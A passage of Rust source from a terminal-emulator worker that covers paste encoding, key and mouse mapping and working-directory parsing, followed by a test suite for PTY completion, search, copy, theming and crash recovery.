    terminal: &Terminal<'_, '_>,
    text: &str,
    origin: PasteOrigin,
) -> Result<Vec<u8>, libghostty_vt::Error> {
    if text.is_empty() {
        return Ok(Vec::new());
    }
    let bracketed = terminal.mode(Mode::BRACKETED_PASTE)?;
    let mut data = match (bracketed, origin) {
        (true, _) => text.as_bytes().to_vec(),
        (false, PasteOrigin::Clipboard) => text.replace("\r\n", "\r").into_bytes(),
        (false, PasteOrigin::Drop) => text
            .chars()
            .map(|character| {
                if character.is_control() && character != '\t' {
                    ' '
                } else {
                    character
                }
            })
            .collect::<String>()
            .into_bytes(),
    };
    // Encoding only replaces bytes in place and adds the frame, so this is
    // the most it can write.
    let mut encoded = vec![0; data.len() + BRACKETED_PASTE_FRAME_BYTES];
    let written = libghostty_vt::paste::encode(&mut data, bracketed, &mut encoded)?;
    encoded.truncate(written);
    Ok(encoded)
}

fn map_key_action(action: KeyAction, report_events: bool) -> key::Action {
    match action {
        KeyAction::Press => key::Action::Press,
        KeyAction::Release => key::Action::Release,
        KeyAction::Repeat if report_events => key::Action::Repeat,
        KeyAction::Repeat => key::Action::Press,
    }
}

fn map_key(input: TerminalKey) -> key::Key {
    match input {
        TerminalKey::Unidentified => key::Key::Unidentified,
        TerminalKey::Character(character) => match character.to_ascii_lowercase() {
            'a' => key::Key::A,
            'b' => key::Key::B,
            'c' => key::Key::C,
            'd' => key::Key::D,
            'e' => key::Key::E,
            'f' => key::Key::F,
            'g' => key::Key::G,
            'h' => key::Key::H,
            'i' => key::Key::I,
            'j' => key::Key::J,
            'k' => key::Key::K,
            'l' => key::Key::L,
            'm' => key::Key::M,
            'n' => key::Key::N,
            'o' => key::Key::O,
            'p' => key::Key::P,
            'q' => key::Key::Q,
            'r' => key::Key::R,
            's' => key::Key::S,
            't' => key::Key::T,
            'u' => key::Key::U,
            'v' => key::Key::V,
            'w' => key::Key::W,
            'x' => key::Key::X,
            'y' => key::Key::Y,
            'z' => key::Key::Z,
            '0' => key::Key::Digit0,
            '1' => key::Key::Digit1,
            '2' => key::Key::Digit2,
            '3' => key::Key::Digit3,
            '4' => key::Key::Digit4,
            '5' => key::Key::Digit5,
            '6' => key::Key::Digit6,
            '7' => key::Key::Digit7,
            '8' => key::Key::Digit8,
            '9' => key::Key::Digit9,
            ' ' => key::Key::Space,
            '-' => key::Key::Minus,
            '=' => key::Key::Equal,
            ',' => key::Key::Comma,
            '.' => key::Key::Period,
            '/' => key::Key::Slash,
            ';' => key::Key::Semicolon,
            '\'' => key::Key::Quote,
            '`' => key::Key::Backquote,
            '[' => key::Key::BracketLeft,
            ']' => key::Key::BracketRight,
            '\\' => key::Key::Backslash,
            _ => key::Key::Unidentified,
        },
        TerminalKey::Backspace => key::Key::Backspace,
        TerminalKey::Enter => key::Key::Enter,
        TerminalKey::Tab => key::Key::Tab,
        TerminalKey::Escape => key::Key::Escape,
        TerminalKey::Delete => key::Key::Delete,
        TerminalKey::Insert => key::Key::Insert,
        TerminalKey::Home => key::Key::Home,
        TerminalKey::End => key::Key::End,
        TerminalKey::PageUp => key::Key::PageUp,
        TerminalKey::PageDown => key::Key::PageDown,
        TerminalKey::ArrowUp => key::Key::ArrowUp,
        TerminalKey::ArrowDown => key::Key::ArrowDown,
        TerminalKey::ArrowLeft => key::Key::ArrowLeft,
        TerminalKey::ArrowRight => key::Key::ArrowRight,
        TerminalKey::Function(number) => match number {
            1 => key::Key::F1,
            2 => key::Key::F2,
            3 => key::Key::F3,
            4 => key::Key::F4,
            5 => key::Key::F5,
            6 => key::Key::F6,
            7 => key::Key::F7,
            8 => key::Key::F8,
            9 => key::Key::F9,
            10 => key::Key::F10,
            11 => key::Key::F11,
            12 => key::Key::F12,
            13 => key::Key::F13,
            14 => key::Key::F14,
            15 => key::Key::F15,
            16 => key::Key::F16,
            17 => key::Key::F17,
            18 => key::Key::F18,
            19 => key::Key::F19,
            20 => key::Key::F20,
            21 => key::Key::F21,
            22 => key::Key::F22,
            23 => key::Key::F23,
            24 => key::Key::F24,
            25 => key::Key::F25,
            _ => key::Key::Unidentified,
        },
    }
}

fn map_modifiers(input: KeyModifiers) -> key::Mods {
    let mut output = key::Mods::empty();
    output.set(key::Mods::SHIFT, input.shift);
    output.set(key::Mods::ALT, input.alt);
    output.set(key::Mods::CTRL, input.control);
    output.set(key::Mods::SUPER, input.super_key);
    output.set(key::Mods::CAPS_LOCK, input.caps_lock);
    output
}

fn map_mouse_action(action: MouseAction) -> mouse::Action {
    match action {
        MouseAction::Press => mouse::Action::Press,
        MouseAction::Release => mouse::Action::Release,
        MouseAction::Motion => mouse::Action::Motion,
    }
}

fn map_mouse_button(button: MouseButton) -> mouse::Button {
    match button {
        MouseButton::Left => mouse::Button::Left,
        MouseButton::Right => mouse::Button::Right,
        MouseButton::Middle => mouse::Button::Middle,
        MouseButton::Back => mouse::Button::Four,
        MouseButton::Forward => mouse::Button::Five,
        MouseButton::WheelUp => mouse::Button::Four,
        MouseButton::WheelDown => mouse::Button::Five,
        MouseButton::Other(number) => match number {
            4 => mouse::Button::Four,
            5 => mouse::Button::Five,
            6 => mouse::Button::Six,
            7 => mouse::Button::Seven,
            8 => mouse::Button::Eight,
            9 => mouse::Button::Nine,
            10 => mouse::Button::Ten,
            11 => mouse::Button::Eleven,
            _ => mouse::Button::Unknown,
        },
    }
}

fn local_host_name() -> Option<&'static str> {
    static NAME: OnceLock<Option<String>> = OnceLock::new();
    NAME.get_or_init(|| {
        let mut buffer = [0u8; 256];
        // SAFETY: gethostname receives a valid writable buffer and its size.
        if unsafe { libc::gethostname(buffer.as_mut_ptr().cast(), buffer.len()) } != 0 {
            return None;
        }
        // An unterminated truncated hostname must not match a different host.
        std::ffi::CStr::from_bytes_until_nul(&buffer)
            .ok()?
            .to_str()
            .ok()
            .map(str::to_owned)
    })
    .as_deref()
}

fn working_directory_path(raw: &str, local_host: Option<&str>) -> Option<PathBuf> {
    if let Ok(uri) = url::Url::parse(raw) {
        if uri.scheme() != "file" {
            return None;
        }
        if uri
            .host_str()
            .zip(local_host)
            .is_some_and(|(host, local)| host.eq_ignore_ascii_case(local))
        {
            return url::Url::parse(&format!("file://{}", uri.path()))
                .ok()?
                .to_file_path()
                .ok();
        }
        uri.to_file_path().ok()
    } else {
        let path = PathBuf::from(raw);
        path.is_absolute().then_some(path)
    }
}

#[cfg(test)]
mod tests {

    use std::{
        collections::BTreeMap,
        ffi::OsStr,
        fs,
        os::unix::fs::{PermissionsExt, symlink},
        sync::atomic::{AtomicUsize, Ordering},
        time::{Duration, Instant},
    };

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn a_second_search_window_cannot_cancel_the_first_windows_query() {
        let published = PublishedState::new(true, Arc::new(|_| {}));
        let first = published.prepare_search(Some(1), 4);
        let other = published.prepare_search(Some(2), 7);
        assert_eq!(first.load(Ordering::Acquire), 4);
        let replacement = published.prepare_search(Some(1), 5);
        assert_eq!(first.load(Ordering::Acquire), 5);
        assert_eq!(other.load(Ordering::Acquire), 7);
        drop((first, other, replacement));
        let local = published.prepare_search(None, 1);
        assert_eq!(published.searches.lock().unwrap().len(), 1);
        assert_eq!(local.load(Ordering::Acquire), 1);
    }

    #[test]
    fn osc7_working_directory_accepts_this_host_and_decodes_its_path() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 0,
        })
        .unwrap();
        terminal.vt_write(b"\x1b]7;file://workstation/tmp/my%20project\x1b\\");
        assert_eq!(
            terminal.pwd().unwrap(),
            "file://workstation/tmp/my%20project"
        );
        assert_eq!(
            working_directory_path(terminal.pwd().unwrap(), Some("WORKSTATION")),
            Some(PathBuf::from("/tmp/my project"))
        );
        assert_eq!(
            working_directory_path("file://remote/tmp/project", Some("workstation")),
            None
        );
        assert_eq!(
            working_directory_path("file://localhost/tmp/project", None),
            Some(PathBuf::from("/tmp/project"))
        );
        assert_eq!(
            working_directory_path("/tmp/project", None),
            Some(PathBuf::from("/tmp/project"))
        );
    }

    #[test]
    fn a_terminal_whose_root_exits_ends_its_output_without_an_error() {
        let mut command = CommandBuilder::new("/bin/sh");
        command.args(["-c", "echo finished"]);
        command.cwd("/");
        let (exits, exited) = crossbeam_channel::bounded(1);
        let held = holder::spawn(
            command,
            PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            },
            exits,
        )
        .unwrap();
        let mut reader = File::from(held.master.duplicate().unwrap());
        let readiness = held.master.duplicate().unwrap();
        let (wake_rx, _wake_tx) = wake_pipe().unwrap();
        let (sender, messages) = crossbeam_channel::unbounded();
        read_pty(&mut reader, &sender, readiness, wake_rx);

        let messages: Vec<_> = messages.try_iter().collect();
        let output: Vec<u8> = messages
            .iter()
            .filter_map(|message| match message {
                PtyMessage::Bytes(bytes) => Some(bytes.as_slice()),
                _ => None,
            })
            .flatten()
            .copied()
            .collect();
        assert!(String::from_utf8_lossy(&output).contains("finished"));
        assert!(
            matches!(messages.last(), Some(PtyMessage::Eof)),
            "{:?}",
            messages.last().map(|message| match message {
                PtyMessage::Error(error) => error.as_str(),
                _ => "not the end",
            })
        );
        let status = exited
            .recv_timeout(Duration::from_secs(5))
            .unwrap()
            .unwrap();
        assert!(status.success());
    }

    #[test]
    fn completion_event_certifies_ended_worker_without_polling() {
        let handle = TerminalHandle::spawn(
            shell_session("printf 'final output'; exit 7"),
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        let events = handle.events();
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        loop {
            match events.recv_deadline(deadline).unwrap() {
                TerminalEvent::Completed { exit_code, .. } => {
                    assert_eq!(exit_code, 7);
                    assert!(
                        handle.is_completed(),
                        "a completion observer must immediately see ended continuity"
                    );
                    assert!(handle.snapshot().lines.iter().any(|line| {
                        line.cells
                            .iter()
                            .map(|cell| cell.text.as_str())
                            .collect::<String>()
                            .contains("final output")
                    }));
                    break;
                }
                TerminalEvent::Error { operation, message } => panic!("{operation}: {message}"),
                _ => {}
            }
        }
    }

    #[test]
    fn completed_pty_retains_search_copy_scroll_theme_and_resize_without_a_worker() {
        let handle = TerminalHandle::spawn(shell_session("i=0; while [ $i -lt 80 ]; do printf 'row%03d\\r\\n' \"$i\"; i=$((i+1)); done; printf '\\033[?2027h👩‍💻hit É Straße'; exit 7"), TerminalConfig { columns: 32, rows: 3, ..TerminalConfig::default() }, |_| {}).unwrap();
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while !handle.is_completed() {
            assert!(std::time::Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }
        assert!(
            handle
                .inner
                .worker
                .lock()
                .unwrap()
                .as_ref()
                .unwrap()
                .is_finished()
        );
        let events = handle.events();
        assert_eq!(
            events
                .try_iter()
                .filter(|event| matches!(event, TerminalEvent::Completed { exit_code: 7, .. }))
                .count(),
            1
        );
        assert!(handle.snapshot().scroll.total > 80);
        handle.search(3, "é".into(), false).unwrap();
        let matches = match events.recv_timeout(Duration::from_secs(1)).unwrap() {
            TerminalEvent::SearchResults {
                request: 3,
                matches,
                ..
            } => matches,
            other => panic!("{other:?}"),
        };
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].start_column, 6);
        handle.scroll_to_row(0).unwrap();
        assert!(
            handle.snapshot().lines[0]
                .cells
                .iter()
                .map(|cell| cell.text.as_str())
                .collect::<String>()
                .contains("row000")
        );
        handle.scroll_to_row(matches[0].start_row as usize).unwrap();
        assert!(handle.snapshot().lines.iter().any(|row| {
            row.cells
                .iter()
                .map(|cell| cell.text.as_str())
                .collect::<String>()
                .contains("hit")
        }));
        let request = uuid::Uuid::new_v4();
        handle
            .copy_selection(
                request,
                super::super::SearchMatch {
                    start_row: 0,
                    start_column: 0,
                    end_row: handle.snapshot().scroll.total - 1,
                    end_column: 32,
                },
            )
            .unwrap();
        match events.recv_timeout(Duration::from_secs(1)).unwrap() {
            TerminalEvent::ClipboardText { request: id, text } => {
                assert_eq!(id, request);
                assert!(text.starts_with("row000\n"));
                assert!(text.contains("👩‍💻hit É Straße"));
            }
            other => panic!("{other:?}"),
        }
        handle
            .resize(TerminalSize {
                columns: 10,
                rows: 5,
                cell_width_px: 9,
                cell_height_px: 18,
            })
            .unwrap();
        assert_eq!(
            handle.snapshot().columns,
            32,
            "read-only output preserves its original column coordinates"
        );
        assert_eq!(handle.snapshot().rows, 5);
        let old_background = handle.snapshot().background;
        handle.set_theme(TerminalTheme::Light).unwrap();
        assert_ne!(handle.snapshot().background, old_background);
        handle.clear_scrollback().unwrap();
        handle.search(4, "row000".into(), true).unwrap();
        assert!(
            matches!(events.recv_timeout(Duration::from_secs(1)).unwrap(), TerminalEvent::SearchResults { matches, .. } if matches.is_empty())
        );
        handle.shutdown().unwrap();
        assert_eq!(
            handle.search(5, "hit".into(), true),
            Err(TerminalSendError::Closed)
        );
        assert!(events.recv_timeout(Duration::from_millis(100)).is_err());
    }

    /// The daemon resizes, searches and copies while holding the host mutex
    /// its wake and event callbacks lock. A completed terminal runs those
    /// commands on the sender's thread, so calling back inline wedged the
    /// whole daemon the first time a pane showing one was resized.
    #[test]
    fn completed_pty_notifies_a_subscriber_whose_lock_the_sender_holds() {
        let host = Arc::new(Mutex::new((Vec::new(), Vec::new())));
        let wakes = Arc::clone(&host);
        let handle = TerminalHandle::spawn(
            shell_session("printf 'retained'; exit 0"),
            TerminalConfig::default(),
            move |wake| wakes.lock().unwrap().0.push(wake.generation),
        )
        .unwrap();
        let events = Arc::clone(&host);
        handle.set_archived_event_observer(move |_, event| events.lock().unwrap().1.push(event));
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while !handle.is_completed() {
            assert!(std::time::Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }

        let held = host.lock().unwrap();
        handle
            .resize(TerminalSize {
                columns: 10,
                rows: 5,
                cell_width_px: 9,
                cell_height_px: 18,
            })
            .unwrap();
        handle.search(1, "retained".into(), true).unwrap();
        let generation = handle.generation();
        drop(held);

        flush_archived_notices();
        let (wakes, events) = &*host.lock().unwrap();
        assert!(wakes.contains(&generation));
        assert!(
            events
                .iter()
                .any(|event| matches!(event, TerminalEvent::SearchResults { request: 1, .. }))
        );
        handle.shutdown().unwrap();
    }

    /// One notifier thread outlives every completed terminal, so a subscriber
    /// that panics must cost only its own notice.
    #[test]
    fn a_panicking_archived_notice_does_not_silence_later_ones() {
        notify_archived(|| panic!("fixture subscriber failure"));
        let (delivered, later) = crossbeam_channel::bounded(1);
        notify_archived(move || {
            let _ = delivered.send(());
        });
        later
            .recv_timeout(Duration::from_secs(5))
            .expect("the notifier stopped after one subscriber panicked");
    }

    #[test]
    fn stalled_archive_preparation_bounds_request_wait() {
        let handle = TerminalHandle::spawn(
            shell_session("exec /bin/cat"),
            TerminalConfig::default(),
            |_| {},
        )
        .unwrap();
        *handle.inner.published.archive.lock().unwrap() = ArchivePhase::Preparing;
        handle
            .set_host_visibility(super::super::ipc::TerminalVisibility::Hidden)
            .unwrap();
        assert!(!handle.inner.published.visible.load(Ordering::Acquire));
        let started = std::time::Instant::now();
        assert_eq!(
            handle.search(1, "query".into(), true),
            Err(TerminalSendError::Closed)
        );
        assert!(started.elapsed() < Duration::from_secs(5));
        *handle.inner.published.archive.lock().unwrap() = ArchivePhase::Live;
        handle.inner.published.archive_ready.notify_all();
        handle.shutdown().unwrap();
    }

    #[test]
    fn accepted_search_is_not_lost_when_a_real_pty_completes() {
        for request in 0..8 {
            let handle = TerminalHandle::spawn(
                shell_session("printf 'retained-hit\\r\\n'; read line; exit 0"),
                TerminalConfig::default(),
                |_| {},
            )
            .unwrap();
            wait_for_text(&handle, "retained-hit");
            handle.input(b"\n").unwrap();
            handle.search(request, "retained-hit".into(), true).unwrap();
            let deadline = std::time::Instant::now() + Duration::from_secs(5);
            while !handle.is_completed() {
                assert!(std::time::Instant::now() < deadline);
                thread::sleep(Duration::from_millis(5));
            }
            assert!(handle.events().try_iter().any(|event| matches!(event, TerminalEvent::SearchResults { request: id, matches, .. } if id == request && matches.len() == 1)));
            handle.shutdown().unwrap();
        }
    }

    #[test]
    fn completed_hidden_no_output_pty_uses_fresh_grid_metadata() {
        let handle = TerminalHandle::spawn(
            shell_session("exit 0"),
            TerminalConfig {
                initially_visible: false,
                columns: 17,
                rows: 4,
                ..TerminalConfig::default()
            },
            |_| {},
        )
        .unwrap();
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        while !handle.is_completed() {
            assert!(std::time::Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }
        assert_eq!(handle.snapshot().columns, 17);
        assert_eq!(handle.snapshot().rows, 4);
        assert!(
            handle
                .snapshot()
                .lines
                .iter()
                .all(|row| row.cells.len() == 17)
        );
        handle.reveal().unwrap();
        handle.search(1, "missing".into(), false).unwrap();
        assert!(handle.events().try_iter().any(|event| matches!(event, TerminalEvent::SearchResults { matches, .. } if matches.is_empty())));
        handle.shutdown().unwrap();
    }

    fn shell_session(script: &str) -> TerminalSession {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec!["-c".into(), script.into()],
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            predecessor: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        }
    }

    /// The handle's screen as text, once it shows `needle`.
    fn wait_for_text(handle: &TerminalHandle, needle: &str) -> String {
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        loop {
            let snapshot = handle.snapshot();
            handle.acknowledge_redraw(snapshot.generation);
            let text = snapshot
                .lines
                .iter()
                .map(|line| {
                    let row: String = line.cells.iter().map(|cell| cell.text.as_str()).collect();
                    row.trim_end().to_owned()
                })
                .collect::<Vec<_>>()
                .join("\n");
            if text.contains(needle) {
                return text;
            }
            assert!(
                std::time::Instant::now() < deadline,
                "never showed {needle:?}:\n{text}"
            );
            thread::sleep(Duration::from_millis(10));
        }
    }

    #[test]
    fn completed_worker_survives_two_daemon_crashes_without_relaunching() {
        const FIXTURE: &str = "CAGENTS_COMPLETED_WORKER_FIXTURE";
        const STAGE: &str = "CAGENTS_COMPLETED_WORKER_STAGE";
        if let Some(directory) = std::env::var_os(FIXTURE) {
            let directory = PathBuf::from(directory);
            let stage = std::env::var(STAGE).unwrap();
            let paths = crate::daemon::RuntimePaths::discover().unwrap();
            let proof = crate::model::HostSessionProof {
                host_session_id: crate::model::HostSessionId::new(format!("worker-{stage}")),
                boot_id: crate::daemon::read_boot_id().unwrap(),
                host_incarnation: crate::model::HostIncarnation::new(format!("worker-{stage}")),
            };
            let _lease = crate::daemon::HostLease::acquire(&paths, &proof).unwrap();
            let holders = paths.directory.join("holders");
            let (mut recovery, adoption) = if stage == "0" {
                let mut source = shell_session(
                    "echo launched >> \"$LAUNCH_COUNT\"; echo completed-worker-result; exit 7",
                );
                source.launch.environment.insert(
                    "LAUNCH_COUNT".into(),
                    directory.join("launches").to_string_lossy().into_owned(),
                );
                (
                    crate::terminal::holder::Recovery {
                        source,
                        previous_sources: Vec::new(),
                        relaunches: Vec::new(),
                        options: crate::terminal::TerminalSpawnOptions::default(),
                        execution_environment: None,
                    },
                    None,
                )
            } else {
                let records = crate::terminal::holder::discover(&holders, &proof.boot_id).unwrap();
                assert_eq!(records.len(), 1);
                let socket = crate::terminal::holder::socket(&holders, records[0].terminal);
                let (mut recovery, lost) = holder::inspect(&socket, &records[0], &proof).unwrap();
                assert!(
                    !lost,
                    "a completed parser saved its final screen before the crash"
                );
                recovery.previous_sources.push(recovery.source.clone());
                (recovery, Some(socket))
            };
            recovery.source.continuity = crate::model::TerminalContinuity::DetachedSameBoot {
                host_session_id: proof.host_session_id,
                boot_id: proof.boot_id,
                host_incarnation: proof.host_incarnation,
            };
            let handle = TerminalHandle::spawn(
                recovery.source.clone(),
                TerminalConfig {
                    holder_recovery: Some(recovery),
                    adoption,
                    ..TerminalConfig::default()
                },
                |_| {},
            )
            .unwrap();
            wait_for_text(&handle, "completed-worker-result");
            let deadline = Instant::now() + Duration::from_secs(10);
            while !handle.is_completed() {
                assert!(Instant::now() < deadline, "worker did not finish");
                thread::sleep(Duration::from_millis(10));
            }
            assert!(
                handle
                    .events()
                    .try_iter()
                    .any(|event| matches!(event, TerminalEvent::Completed { exit_code: 7, .. }))
            );
            assert!(
                handle
                    .inner
                    .published
                    .retained_holder
                    .lock()
                    .unwrap()
                    .is_some()
            );
            assert_eq!(
                fs::read_to_string(directory.join("launches")).unwrap(),
                "launched\n"
            );
            if stage == "1" {
                // Failed restore cleanup can race a worker that has already
                // completed. Its disconnected command path still joins and
                // preserves the final holder instead of releasing it.
                handle.preserve_for_restart().unwrap();
            }
            if stage == "2" {
                handle.shutdown().unwrap();
                assert!(
                    crate::terminal::holder::discover(
                        &holders,
                        &crate::daemon::read_boot_id().unwrap()
                    )
                    .unwrap()
                    .is_empty()
                );
                return;
            }
            fs::write(directory.join(format!("ready-{stage}")), "ready").unwrap();
            loop {
                thread::park();
            }
        }

        struct Cleanup {
            daemon: Option<std::process::Child>,
            records: Vec<crate::terminal::holder::Record>,
        }
        impl Drop for Cleanup {
            fn drop(&mut self) {
                if let Some(child) = self.daemon.as_mut() {
                    let _ = child.kill();
                    let _ = child.wait();
                }
                for record in &self.records {
                    if record.holder.is_current() {
                        // Exact start identity was checked, and this test alone owns the holder.
                        unsafe {
                            libc::kill(record.holder.pid, libc::SIGKILL);
                        }
                    }
                }
            }
        }
        let directory = tempdir().unwrap();
        let holders = directory
            .path()
            .join(crate::instance::RUNTIME_SUBDIRECTORY)
            .join("holders");
        let mut cleanup = Cleanup {
            daemon: None,
            records: Vec::new(),
        };
        for stage in 0..3 {
            cleanup.daemon = Some(std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "terminal::worker::tests::completed_worker_survives_two_daemon_crashes_without_relaunching", "--nocapture"])
                .env_clear().env("PATH", "/usr/bin:/bin").env("HOME", directory.path())
                .env("XDG_RUNTIME_DIR", directory.path()).env(FIXTURE, directory.path())
                .env(STAGE, stage.to_string()).spawn().unwrap());
            let deadline = Instant::now() + Duration::from_secs(15);
            if stage == 2 {
                loop {
                    if let Some(status) = cleanup.daemon.as_mut().unwrap().try_wait().unwrap() {
                        assert!(status.success());
                        break;
                    }
                    assert!(
                        Instant::now() < deadline,
                        "completed cleanup did not finish"
                    );
                    thread::sleep(Duration::from_millis(10));
                }
            } else {
                while !directory.path().join(format!("ready-{stage}")).exists() {
                    assert!(
                        cleanup
                            .daemon
                            .as_mut()
                            .unwrap()
                            .try_wait()
                            .unwrap()
                            .is_none()
                    );
                    assert!(
                        Instant::now() < deadline,
                        "completed worker did not become ready"
                    );
                    thread::sleep(Duration::from_millis(10));
                }
                let records = crate::terminal::holder::discover(
                    &holders,
                    &crate::daemon::read_boot_id().unwrap(),
                )
                .unwrap();
                assert_eq!(records.len(), 1);
                if stage == 0 {
                    cleanup.records = records.clone();
                }
                assert_eq!(records[0], cleanup.records[0]);
                cleanup.daemon.as_mut().unwrap().kill().unwrap();
                cleanup.daemon.as_mut().unwrap().wait().unwrap();
            }
            cleanup.daemon = None;
        }
        assert_eq!(
            fs::read_to_string(directory.path().join("launches")).unwrap(),
            "launched\n"
        );
        assert!(
            crate::terminal::holder::discover(&holders, &crate::daemon::read_boot_id().unwrap())
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn a_carried_terminal_keeps_its_process_and_screen_for_a_successor() {
        let directory = tempdir().unwrap();
        let socket = directory.path().join("holder.sock");
        let session = shell_session(
            "printf '\\033]2;carried title\\007'; echo before; \
             read line; echo \"after:$line\"; read line",
        );
        let first =
            TerminalHandle::spawn(session.clone(), TerminalConfig::default(), |_| {}).unwrap();
        let before = wait_for_text(&first, "before");
        let carried = first.carry(socket.clone()).unwrap();
        assert_eq!(carried.size.columns, TerminalConfig::default().columns);
        // The worker is gone; the terminal's process is not.
        assert!(first.is_completed());
        assert!(first.input("lost?").is_err());

        let config = TerminalConfig {
            adoption: Some(socket.clone()),
            ..TerminalConfig::default()
        };
        let second = TerminalHandle::spawn(session, config, |_| {}).unwrap();
        assert_eq!(wait_for_text(&second, "before"), before);
        second.input(b"hello\n".to_vec()).unwrap();
        wait_for_text(&second, "after:hello");
        let events: Vec<_> = second.events().try_iter().collect();
        assert!(
            events.contains(&TerminalEvent::TitleChanged("carried title".into())),
            "{events:?}"
        );
        assert!(!socket.exists());
        second.shutdown().unwrap();
    }

    #[test]
    fn a_terminal_that_cannot_be_carried_keeps_running_here() {
        let directory = tempdir().unwrap();
        let session = shell_session("echo before; read line; echo \"after:$line\"; read line");
        let handle = TerminalHandle::spawn(session, TerminalConfig::default(), |_| {}).unwrap();
        wait_for_text(&handle, "before");
        let unreachable = directory.path().join("missing").join("holder.sock");
        assert!(handle.carry(unreachable).is_err());
        assert!(!handle.is_completed());
        handle.input(b"still here\n".to_vec()).unwrap();
        wait_for_text(&handle, "after:still here");
        handle.shutdown().unwrap();
    }

    #[test]
    fn omp_display_title_drops_lifecycle_animation_but_preserves_labels() {
        use crate::agent::{Activity, Provider};
        let title = |value: &str| {
            canonical_agent_title(
                value,
                Provider::Omp
                    .activity_from_title(value)
                    .map(|state| Activity {
                        provider: Provider::Omp,
                        state,
                    }),
            )
        };
        assert_eq!(title("π ⠋ project"), title("π ⠙ project"));
        assert_eq!(title("π > project"), "π project");
        assert_eq!(title("π ! renamed"), "π renamed");
        assert_eq!(title("custom title"), "custom title");
        assert_eq!(canonical_agent_title("π ⠋ project", None), "π ⠋ project");
    }

    #[test]
    fn changing_parser_theme_preserves_truecolor_and_osc_overrides_and_queries() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 8,
            rows: 2,
            max_scrollback: 0,
        })
        .unwrap();
        let replies = Rc::new(RefCell::new(Vec::new()));
        terminal
            .on_pty_write({
                let replies = Rc::clone(&replies);
                move |_, bytes| replies.borrow_mut().extend_from_slice(bytes)
            })
            .unwrap();
        apply_theme(&mut terminal, TerminalTheme::Dark).unwrap();
        terminal.vt_write(b"\x1b[38;2;18;52;86mT\x1b[0mD\x1b[31mR\x1b[0m");
        let mut visual = VisualResources::new().unwrap();
        let dark = visual.capture(&terminal, 1, true, None).unwrap().unwrap();
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let dark_queries = std::mem::take(&mut *replies.borrow_mut());
        apply_theme(&mut terminal, TerminalTheme::Light).unwrap();
        let light = visual.capture(&terminal, 2, true, None).unwrap().unwrap();
        assert_eq!(
            dark.lines[0].cells[0].foreground,
            light.lines[0].cells[0].foreground
        );
        assert_ne!(
            dark.lines[0].cells[1].foreground,
            light.lines[0].cells[1].foreground
        );
        assert_ne!(
            dark.lines[0].cells[2].foreground,
            light.lines[0].cells[2].foreground
        );
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let light_queries = std::mem::take(&mut *replies.borrow_mut());
        assert!(!light_queries.is_empty());
        assert_ne!(dark_queries, light_queries);
        terminal.vt_write(b"\x1b]10;#123456\x07\x1b]11;#345678\x07\x1b]4;1;#56789a\x07");
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        let overridden = std::mem::take(&mut *replies.borrow_mut());
        apply_theme(&mut terminal, TerminalTheme::SolarizedDark).unwrap();
        terminal.vt_write(b"\x1b]10;?\x07\x1b]11;?\x07\x1b]4;1;?\x07");
        assert_eq!(*replies.borrow(), overridden);
        terminal.vt_write(b"\x1b]110\x07\x1b]111\x07\x1b]104;1\x07");
        assert_eq!(
            terminal.fg_color().unwrap(),
            terminal.default_fg_color().unwrap()
        );
        assert_eq!(
            terminal.bg_color().unwrap(),
            terminal.default_bg_color().unwrap()
        );
        assert_eq!(
            terminal.color_palette().unwrap().get(PaletteIndex::RED),
            terminal
                .default_color_palette()
                .unwrap()
                .get(PaletteIndex::RED)
        );
    }

    fn capture_worker() -> (Worker, Receiver<TerminalEvent>) {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/true".into(),
            arguments: Vec::new(),
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        };
        capture_worker_for(recipe)
    }

    fn capture_worker_for(recipe: LaunchRecipe) -> (Worker, Receiver<TerminalEvent>) {
        capture_worker_with(recipe, TerminalConfig::default())
    }

    fn capture_worker_with(
        recipe: LaunchRecipe,
        config: TerminalConfig,
    ) -> (Worker, Receiver<TerminalEvent>) {
        let session = TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            predecessor: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        };
        let (_tx, commands) = command_channel(1);
        let (events, receiver) = crossbeam_channel::unbounded();
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        (
            Worker::start(session, config, commands, events, published).unwrap(),
            receiver,
        )
    }

    #[test]
    fn fresh_omp_activity_does_not_require_a_resumable_session() {
        use crate::agent::{Activity, ActivityState, Provider};
        use std::time::Instant;
        let directory = tempdir().unwrap();
        let executable = directory.path().join("omp");
        symlink("/bin/sleep", &executable).unwrap();
        let (mut worker, events) = capture_worker_for(LaunchRecipe {
            unset_environment: Default::default(),
            program: executable.to_str().unwrap().into(),
            arguments: vec!["10".into()],
            working_directory: directory.path().into(),
            environment: BTreeMap::from([
                ("HOME".into(), directory.path().to_str().unwrap().into()),
                (
